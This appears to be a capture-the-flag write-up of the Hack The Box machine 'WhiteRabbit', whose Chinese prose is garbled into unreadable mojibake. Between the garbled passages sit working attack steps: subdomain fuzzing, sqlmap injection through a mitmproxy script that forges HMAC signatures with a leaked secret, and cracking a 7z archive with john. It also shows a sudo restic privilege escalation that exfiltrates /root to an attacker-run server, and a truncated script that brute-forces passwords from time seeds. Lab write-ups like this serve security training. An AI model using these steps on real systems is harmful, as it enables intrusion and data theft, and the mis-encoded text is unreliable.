Scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">0</span>.<span class="hljs-number">36</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br><span class="hljs-attribute">Initiating</span> Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Completed</span> Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">13</span>.<span class="hljs-number">00</span>s elapsed<br><span class="hljs-attribute">DNS</span> resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">13</span>.<span class="hljs-number">01</span>s. Mode: Async<span class="hljs-meta"> [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]</span><br><span class="hljs-attribute">Initiating</span> SYN Stealth Scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">10.10.11.63</span><span class="hljs-meta"> [3 ports]</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">2222</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">22</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">80</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Completed</span> SYN Stealth Scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">3</span>.<span class="hljs-number">01</span>s elapsed (<span class="hljs-number">3</span> total ports)<br><span class="hljs-attribute">Initiating</span> Service scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">3</span> services <span class="hljs-literal">on</span> <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Completed</span> Service scan at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">6</span>.<span class="hljs-number">92</span>s elapsed (<span class="hljs-number">3</span> services <span class="hljs-literal">on</span> <span class="hljs-number">1</span> host)<br><span class="hljs-attribute">NSE</span>: Script scanning <span class="hljs-number">10.10.11.63</span>.<br><span class="hljs-attribute">NSE</span>: Starting runlevel <span class="hljs-number">1</span> (of <span class="hljs-number">2</span>) scan.<br><span class="hljs-attribute">Initiating</span> NSE at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Completed</span> NSE at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">4</span>.<span class="hljs-number">49</span>s elapsed<br><span class="hljs-attribute">NSE</span>: Starting runlevel <span class="hljs-number">2</span> (of <span class="hljs-number">2</span>) scan.<br><span class="hljs-attribute">Initiating</span> NSE at <span class="hljs-number">06</span>:<span class="hljs-number">06</span><br><span class="hljs-attribute">Completed</span> NSE at <span class="hljs-number">06</span>:<span class="hljs-number">06</span>, <span class="hljs-number">1</span>.<span class="hljs-number">85</span>s elapsed<br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">10.10.11.63</span><br><span class="hljs-attribute">Host</span> is up, received echo-reply ttl <span class="hljs-number">63</span> (<span class="hljs-number">0</span>.<span class="hljs-number">33</span>s latency).<br><span class="hljs-attribute">Scanned</span> at <span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">06</span> <span class="hljs-number">06</span>:<span class="hljs-number">06</span>:<span class="hljs-number">19</span> UTC for <span class="hljs-number">17</span>s<br><br><span class="hljs-attribute">PORT</span>     STATE SERVICE REASON         VERSION<br><span class="hljs-attribute">22</span>/tcp   open  ssh     syn-ack ttl <span class="hljs-number">63</span> OpenSSH <span class="hljs-number">9</span>.<span class="hljs-number">6</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu13.<span class="hljs-number">9</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp   open  http    syn-ack ttl <span class="hljs-number">62</span> Caddy httpd<br><span class="hljs-attribute">2222</span>/tcp open  ssh     syn-ack ttl <span class="hljs-number">62</span> OpenSSH <span class="hljs-number">9</span>.<span class="hljs-number">6</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu13.<span class="hljs-number">5</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">Service</span> Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br><span class="hljs-attribute">Read</span> data files from: /usr/bin/../share/nmap<br><span class="hljs-attribute">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-attribute">Nmap</span> done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">30</span>.<span class="hljs-number">91</span> seconds<br>           <span class="hljs-attribute">Raw</span> packets sent: <span class="hljs-number">10</span> (<span class="hljs-number">416</span>B) | Rcvd: <span class="hljs-number">5</span> (<span class="hljs-number">212</span>B)<br></code></pre></td></tr></table></figure><p>å¼€æ”¾22 80å’Œ 2222ç«¯å£</p><p>åˆ©ç”¨dirsearchæ‰«åå°ä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œä¸‹é¢åˆ©ç”¨ffufå°è¯•çˆ†ç ´ä¸€ä¸‹å­åŸŸåã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffuf</span> -w subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://whiterabbit.htb -H <span class="hljs-string">&quot;Host:FUZZ.whiterabbit.htb&quot;</span> -mc <span class="hljs-number">200</span>,<span class="hljs-number">302</span> -fs <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504070001330.png" alt="image-20250407000104188"></p><p>æ¥ç€æ‰«æ–°åŸŸåçš„ç›®å½•ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504070000136.png" alt="image-20250407000042989"></p><p>å†statusç›®å½•ä¸‹æ‰«åˆ°temp</p><p>é‡Œé¢åˆå­˜æ”¾ç€å…¶ä»–çš„å­åŸŸåã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071645578.png" alt="image-20250407164515349"></p><p>åŠ åˆ°/etc/hostsä¸­</p><p>å†wikijsä¸­å†æ¬¡å‘ç°ä¸€ä¸ªæ–°çš„å­åŸŸåï¼Œæ¥ç€æ·»åŠ ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071651031.png" alt="image-20250407165124861"></p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>è¿™ä¸ªåœ°æ–¹æœ‰ä¸€ä¸ªjsonçš„æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ã€‚</p><p>è®©aiå¤§æ¦‚åˆ†æä¸€ä¸‹ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„ç‚¹å°±æ˜¯å®ƒé¦–å…ˆä¼šæ£€æŸ¥x-gophish-signature ä¹Ÿå³æ˜¯ç­¾åçš„æ­£ç¡®æ€§ï¼Œè¿™ä¸ªç­¾åæ˜¯æ ¹æ®secretå’Œè¯·æ±‚ä½“è¿›è¡ŒåŠ å¯†çš„ï¼Œå½“è¯·æ±‚ä½“å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œç­¾åå°±ä¼šç”Ÿæ•ˆï¼Œéœ€è¦æ–°çš„ç­¾åã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071914563.png" alt="image-20250407191447386"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071915257.png" alt="image-20250407191507124"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071912733.png" alt="image-20250407191244407"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504071913588.png" alt="image-20250407191310430"></p><h2 id="ä¸­é—´ä»£ç†ç­¾å"><a href="#ä¸­é—´ä»£ç†ç­¾å" class="headerlink" title="ä¸­é—´ä»£ç†ç­¾å"></a>ä¸­é—´ä»£ç†ç­¾å</h2><p>è¿™ä¸ªemailå­˜åœ¨sqlæ³¨å…¥ç‚¹ï¼Œè€Œsecretæˆ‘ä»¬æ˜¯çŸ¥é“çš„ï¼Œæ‰€ä»¥åˆ©ç”¨sqlmapè¿›è¡Œè·‘çš„æ—¶å€™éœ€è¦ä¸æ–­æ›´æ–°ç­¾åçš„å†…å®¹ã€‚</p><p>åˆ©ç”¨mitmproxy ä¸­é—´äººä»£ç†çš„ä¸€ä¸ªå·¥å…·ï¼ŒåŠ«æŒæ¯ä¸€ä¸ªä»sqlmapå‘å‡ºå»çš„åŒ…ï¼Œç„¶åç»è¿‡ç­¾åä¹‹åå†å‘é€å‡ºå»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># gophish_sign.py</span><br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> http<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> hashlib<br><br>SECRET = <span class="hljs-string">b&quot;3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">flow: http.HTTPFlow</span>):<br>    <span class="hljs-keyword">if</span> flow.request.path.startswith(<span class="hljs-string">&quot;/webhook/&quot;</span>) <span class="hljs-keyword">and</span> flow.request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            raw_data = flow.request.get_content()<br>            signature = hmac.new(SECRET, raw_data, hashlib.sha256).hexdigest()<br>            flow.request.headers[<span class="hljs-string">&quot;x-gophish-signature&quot;</span>] = <span class="hljs-string">f&quot;sha256=<span class="hljs-subst">&#123;signature&#125;</span>&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            flow.request.headers[<span class="hljs-string">&quot;x-gophish-signature&quot;</span>] = <span class="hljs-string">&quot;error-signing&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;</span> \<br>  <span class="hljs-params">--data=</span>&#x27;&#123;<span class="hljs-string">&quot;campaign_id&quot;</span><span class="hljs-function">:1</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Clicked Link&quot;</span>&#125;&#x27; \<br>  <span class="hljs-params">--headers=</span><span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  <span class="hljs-params">--proxy=</span><span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span> \<br>  <span class="hljs-params">--random-agent</span> <span class="hljs-params">--batch</span> \<br>  <span class="hljs-params">--technique=BE</span> <span class="hljs-params">--time-sec=3</span> <span class="hljs-params">--dbs</span><br><br>sqlmap -u <span class="hljs-string">&quot;http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;</span> \<br>  <span class="hljs-params">--data=</span>&#x27;&#123;<span class="hljs-string">&quot;campaign_id&quot;</span><span class="hljs-function">:1</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Clicked Link&quot;</span>&#125;&#x27; \<br>  <span class="hljs-params">--headers=</span><span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  <span class="hljs-params">--proxy=</span><span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span> \<br>  <span class="hljs-params">--random-agent</span> <span class="hljs-params">--batch</span> \<br>  <span class="hljs-params">--technique=BE</span> <span class="hljs-params">--time-sec=3</span> -D phishing <span class="hljs-params">--tables</span><br>  <br>  mitmproxy -s gophish_sign.py <span class="hljs-params">--mode</span> regular <span class="hljs-params">--listen-port</span> 9999<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072008593.png" alt="image-20250407200836484"></p><p>å†tempæ•°æ®åº“ä¸‹å‘ç°æ—¥å¿—çš„ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072015938.png" alt="image-20250407201548868"></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+---------------------+------------------------------------------------------------------------------+----+<br>|<span class="hljs-string"> date                </span>|<span class="hljs-string"> command                                                                      </span>|<span class="hljs-string"> id </span>|<br>+---------------------+------------------------------------------------------------------------------+----+<br>|<span class="hljs-string"> 2024-08-30 10:44:01 </span>|<span class="hljs-string"> uname -a                                                                     </span>|<span class="hljs-string"> 1  </span>|<br>|<span class="hljs-string"> 2024-08-30 11:58:05 </span>|<span class="hljs-string"> restic init --repo rest:http://75951e6ff.whiterabbit.htb                     </span>|<span class="hljs-string"> 2  </span>|<br>|<span class="hljs-string"> 2024-08-30 11:58:36 </span>|<span class="hljs-string"> echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd                       </span>|<span class="hljs-string"> 3  </span>|<br>|<span class="hljs-string"> 2024-08-30 11:59:02 </span>|<span class="hljs-string"> rm -rf .bash_history                                                         </span>|<span class="hljs-string"> 4  </span>|<br>|<span class="hljs-string"> 2024-08-30 11:59:47 </span>|<span class="hljs-string"> #thatwasclose                                                                </span>|<span class="hljs-string"> 5  </span>|<br>|<span class="hljs-string"> 2024-08-30 14:40:42 </span>|<span class="hljs-string"> cd /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator </span>|<span class="hljs-string"> passwd </span>|<span class="hljs-string"> 6  </span>|<br>+---------------------+------------------------------------------------------------------------------+----+<br></code></pre></td></tr></table></figure><h2 id="restic"><a href="#restic" class="headerlink" title="restic"></a>restic</h2><p>ä¸»è¦æ˜¯è¿™ä¸ªrestic.</p><p>Restic æ˜¯<strong>ä¸€ä¸ªå…è´¹çš„ï¼Œå¿«é€Ÿï¼Œå¼€æºï¼Œå®‰å…¨å’Œè·¨å¹³å°çš„å¤‡ä»½ç¨‹åº</strong>ï¼Œä½¿ç”¨ go ç¼–ç¨‹è¯­è¨€ç¼–å†™ï¼Œä½¿ç”¨ AES-256 å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä½¿ç”¨ Poly1305-AES å¯¹æ•°æ®è¿›è¡Œèº«ä»½éªŒè¯ã€‚ Restic æ˜¯ä¸€ä¸ªå¿«é€Ÿä¸”å®‰å…¨çš„æ•°æ®æ–‡ä»¶å¤‡ä»½ç¨‹åºã€‚</p><p>æˆ‘ä»¬çŸ¥é“äº†å¯†ç ï¼Œå°±èƒ½ä»è¿œç¨‹ä»“åº“ä¸Šä¸‹è½½æ–‡ä»¶ã€‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; <span class="hljs-string">.restic_passwd</span><br>restic -r rest<span class="hljs-function">:http</span>:<span class="hljs-string">//75951e6ff.whiterabbit.htb</span> <span class="hljs-params">--password-file</span> <span class="hljs-string">.restic_passwd</span> snapshots  <span class="hljs-string">//</span>æŸ¥çœ‹æœ‰å“ªäº›å¿«ç…§<br>restic -r rest<span class="hljs-function">:http</span>:<span class="hljs-string">//75951e6ff.whiterabbit.htb</span> <span class="hljs-params">--password-file</span> <span class="hljs-string">.restic_passwd</span> <span class="hljs-keyword">ls</span> 272cacd5 <span class="hljs-string">//</span>åˆ—å‡ºå¿«ç…§é‡Œé¢çš„æ–‡ä»¶<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072113734.png" alt="image-20250407211316575"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072115467.png" alt="image-20250407211545323"></p><p>å°†è¿™ä¸ª7zæ–‡ä»¶ç»™downä¸‹æ¥ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">restic -r rest:http:<span class="hljs-regexp">//</span><span class="hljs-number">75951</span>e6ff.whiterabbit.htb \<br>  --password-file .restic_passwd \<br>  restore <span class="hljs-number">272</span>cacd5 \<br>  --target <span class="hljs-regexp">/root/</span>HTB/HTB-WhiteRabbit \<br>  --include <span class="hljs-regexp">/dev/</span>shm<span class="hljs-regexp">/bob/</span>ssh/bob.<span class="hljs-number">7</span>z<br><span class="hljs-regexp">//</span>  --target æŒ‡å®šçš„æ˜¯å­˜æ”¾åœ¨æœ¬æœºçš„è·¯å¾„åœ°å€<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072118118.png" alt="image-20250407211841882"></p><p>ç›´æ¥è§£çš„è¯æ˜¯ä¸è¡Œçš„ï¼Œå¾—éœ€è¦å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072120442.png" alt="image-20250407212013291"></p><p>é¦–å…ˆå…ˆå°†7zæ–‡ä»¶å˜æˆå¯ä»¥çˆ†ç ´çš„å½¢å¼ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">7</span>z2john bob<span class="hljs-number">.7</span>z &gt; bob.<span class="hljs-built_in">hash</span><br>john --format=<span class="hljs-number">7</span>z bob.<span class="hljs-built_in">hash</span> --wordlist=<span class="hljs-regexp">/usr/</span>share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072153182.png" alt="image-20250407215343018"></p><p>èƒ½çˆ†ç ´å‡ºå¯†ç ã€‚</p><p>æ˜¯ä¸€ä¸ªbobçš„å…¬ç§é’¥å¯¹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072157507.png" alt="image-20250407215701323"></p><p>ç›´æ¥æ— å¯†ç ç™»å½•è¿›å»ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072201062.png" alt="image-20250407220102901"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072207224.png" alt="image-20250407220732106"></p><p>è¿™ä¸ªææƒæ‰‹æ³•åœ¨<a href="https://gtfobins.github.io/gtfobins/restic/#sudo%E8%83%BD%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E3%80%82">https://gtfobins.github.io/gtfobins/restic/#sudoèƒ½æ‰¾åˆ°å¯¹åº”çš„ã€‚</a></p><h2 id="resticææƒ"><a href="#resticææƒ" class="headerlink" title="resticææƒ"></a>resticææƒ</h2><p>åˆ©ç”¨æ€è·¯å°±æ˜¯å°†å¯¹åº”ä¸»æœºä¸Šé«˜æƒé™æ‰èƒ½è®¿é—®çš„æ–‡ä»¶ç»™å¤‡ä»½åˆ°kaliä¸Šã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">kaliï¼š <br>.<span class="hljs-regexp">/rest-server --no-auth --listen :8000 --path /</span>root<span class="hljs-regexp">/HTB/</span>HTB-WhiteRabbit<br>å—æ§ä¸»æœºï¼š<br>sudo restic -r rest:http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.24</span>:<span class="hljs-number">8000</span> init<br>echo <span class="hljs-string">&quot;fsrm123&quot;</span> &gt; <span class="hljs-regexp">/tmp/</span>pass.txt<br>sudo restic -r rest:http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.24</span>:<span class="hljs-number">8000</span> --password-file <span class="hljs-regexp">/tmp/</span>pass.txt backup /root<br><br><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072252972.png" alt="image-20250407225249871"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">expoexport RESTIC_PASSWORD=fsrm123<br>restic -r <span class="hljs-regexp">/root/</span>HTB/HTB-WhiteRabbit snapshots<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072253804.png" alt="image-20250407225300699"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">restic -r <span class="hljs-regexp">/root/</span>HTB<span class="hljs-regexp">/HTB-WhiteRabbit restore 52214260 --target /</span>root<span class="hljs-regexp">/HTB/</span>HTB-WhiteRabbit  <span class="hljs-regexp">//</span>è¿˜åŸæ–‡ä»¶<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072256820.png" alt="image-20250407225644698"></p><p>åˆæ˜¯ä¸€ä¸ªå…¬ç§é’¥å¯¹ï¼Œæ¥ç€ç™»å½•ä¸Šå»ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072258354.png" alt="image-20250407225848235"></p><p>åˆ°homeç›®å½•ä¸‹å‘ç°è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·ï¼Œneo</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072300396.png" alt="image-20250407230051302"></p><p>åœ¨optç›®å½•ä¸‹å‘ç°neoçš„ç›¸å…³å¯†ç ä¿¡æ¯ï¼Œä½†æ˜¯æ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><h2 id="neoå¯†ç åˆ†æ"><a href="#neoå¯†ç åˆ†æ" class="headerlink" title="neoå¯†ç åˆ†æ"></a>neoå¯†ç åˆ†æ</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072307421.png" alt="image-20250407230709316"></p><p>ä¸‹è½½ä¸‹æ¥åˆ†æä¸€æ³¢ï¼Œå†…ç½®æœ‰pythonç¯å¢ƒï¼Œå¼€ä¸€ä¸ª8081ç«¯å£ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072311916.png" alt="image-20250407231122748"></p><p>F5è¿›å…¥åˆ°mainå‡½æ•°ä¸­ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072327464.png" alt="image-20250407232720319"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072343088.png" alt="image-20250407234305964"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072343499.png" alt="image-20250407234315379"></p><p>è®©AIåˆ†æäº†ä¸€ä¸‹ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯åŸºäºå½“å‰çš„æ—¶é—´æˆ³ç”Ÿæˆä¸€ä¸ªéšæœºçš„å¯†ç ï¼Œå¯†ç é•¿åº¦æ˜¯20ä½ã€‚</p><p>æ—¶é—´çš„è¯å°±æ˜¯ä¸Šé¢sqlè·‘å‡ºæ¥çš„ 2024-08-30 14:40:42</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504072346591.png" alt="image-20250407234640506"></p><p>ä»å½“å‰æ—¶é—´æˆ³å¼€å§‹ï¼Œçˆ†ç ´1000æ¯«ç§’ä»¥å†…çš„ç”Ÿæˆçš„å¯†ç ã€‚</p><p>æ³¨æ„åŒºåˆ«æ˜¯cè¯­è¨€ä¸‹çš„seedï¼Œè€Œä¸æ˜¯pythonä¸‹çš„seed.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># æ ¹æ®å¹³å°åŠ è½½é€‚å½“çš„Cåº“ã€‚</span><br><span class="hljs-keyword">if</span> sys.platform.startswith(<span class="hljs-string">&#x27;linux&#x27;</span>):<br>    libc = ctypes.CDLL(<span class="hljs-string">&quot;libc.so.6&quot;</span>)  <span class="hljs-comment"># Linuxå¹³å°</span><br><span class="hljs-keyword">elif</span> sys.platform == <span class="hljs-string">&quot;darwin&quot;</span>:<br>    libc = ctypes.CDLL(<span class="hljs-string">&quot;libc.dylib&quot;</span>)  <span class="hljs-comment"># macOSå¹³å°</span><br><span class="hljs-keyword">elif</span> sys.platform.startswith(<span class="hljs-string">&#x27;win&#x27;</span>):<br>    libc = ctypes.CDLL(<span class="hljs-string">&quot;msvcrt.dll&quot;</span>)  <span class="hljs-comment"># Windowså¹³å°</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;ä¸æ”¯æŒçš„æ“ä½œç³»ç»Ÿå¹³å°&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_password</span>(<span class="hljs-params">seed</span>):<br>    charset = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>  <span class="hljs-comment"># å¯†ç å­—ç¬¦é›†</span><br>    <span class="hljs-comment"># ä½¿ç”¨Cåº“çš„srand()è®¾ç½®ç§å­ï¼Œé™åˆ¶seedä¸º32ä½æ•´æ•°</span><br>    libc.srand(seed &amp; <span class="hljs-number">0xFFFFFFFF</span>)  <span class="hljs-comment"># ä¿è¯ç§å­å€¼åœ¨32ä½èŒƒå›´å†…</span><br>    password = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        <span class="hljs-comment"># è°ƒç”¨Cåº“çš„rand()ç”Ÿæˆéšæœºæ•°</span><br>        r = libc.rand()<br>        index = r % <span class="hljs-built_in">len</span>(charset)  <span class="hljs-comment"># ä¿è¯ç”Ÿæˆçš„ç´¢å¼•åœ¨å­—ç¬¦é›†é•¿åº¦èŒƒå›´å†…ï¼ˆ62ä¸ªå­—ç¬¦ï¼‰</span><br>        password.append(charset[index])  <span class="hljs-comment"># æ·»åŠ å­—ç¬¦åˆ°å¯†ç åˆ—è¡¨</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(password))  <span class="hljs-comment"># 